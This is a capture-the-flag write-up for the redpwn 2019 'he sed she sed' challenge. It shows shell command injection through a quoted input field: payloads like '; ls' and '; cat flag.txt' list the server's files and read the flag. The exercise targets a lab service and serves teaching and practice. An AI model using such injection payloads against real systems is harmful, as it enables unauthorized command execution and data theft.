## he sed she sed
> I'm not really sure what I sed to this program, so it fixes it for me!

> nc chall2.2019.redpwn.net 6004

Let's test with some random inputs.
```
$ nc chall2.2019.redpwn.net 6004
What you thought you sed
a
What you aren't sure you sed
b
What you actually sed
c
You actually said
a
$ nc chall2.2019.redpwn.net 6004
What you thought you sed
\\
What you aren't sure you sed
\
What you actually sed
\
You actually said
sed: -e expression #1, char 7: unterminated `s' command
$ nc chall2.2019.redpwn.net 6004
What you thought you sed
'
\What you aren't sure you sed

What you actually sed
\
You actually said
sh: 1: Syntax error: Unterminated quoted string
```
Hmmm, let's try terminating the quoted string and see what happens.
```
$ nc chall2.2019.redpwn.net 6004
What you thought you sed
';a'
What you aren't sure you sed
a
What you actually sed
a
You actually said

sh: 1: a: not found
```
Great, we found a way to execute shell commands!
```
$ nc chall2.2019.redpwn.net 6004
What you thought you sed
'; ls'
What you aren't sure you sed
a
What you actually sed
a
You actually said

bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
sed.py
srv
sys
tmp
usr
var
$ nc chall2.2019.redpwn.net 6004
What you thought you sed
'; cat flag.txt'
What you aren't sure you sed
a
What you actually sed
a
You actually said

flag{th4ts_wh4t_sh3_sed}
```
